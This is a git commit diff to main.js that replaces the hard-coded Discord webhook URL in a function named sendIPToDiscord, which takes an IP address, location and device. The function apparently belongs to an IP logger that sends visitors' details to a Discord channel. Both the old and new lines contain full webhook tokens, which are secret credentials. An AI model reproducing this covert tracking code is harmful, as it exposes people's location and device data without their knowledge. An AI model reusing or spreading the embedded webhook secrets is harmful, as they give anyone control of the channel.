ef29b8b0b488aaca37c7629ef799273a72c12e2f
BoembaBalu <139887716+BoembaBalu@users.noreply.github.com>
2023-07-18 16:53:47 +0200

    Update main.js

--- main.js
+++ main.js
@@ -1,5 +1,5 @@
 function sendIPToDiscord(ipAddress, location, device) {
-    const webhookURL = "https://discord.com/api/webhooks/1130872297675301035/dOp9OQsVLg4sE4iWIN55ujEDajlkb7Ygy-muWZB3p1ByvPVmnOe7MH9-nZkd157BSB5b";
+    const webhookURL = "https://discord.com/api/webhooks/1130874931836633118/iPSodLf_QHFQpM_8_Ai4715BsHITxdDrbYHlZHwRU_6-KRigiTSb1UKKQB9qFoAU9RYc";
 
     const embedData = {
         color: 16769485,
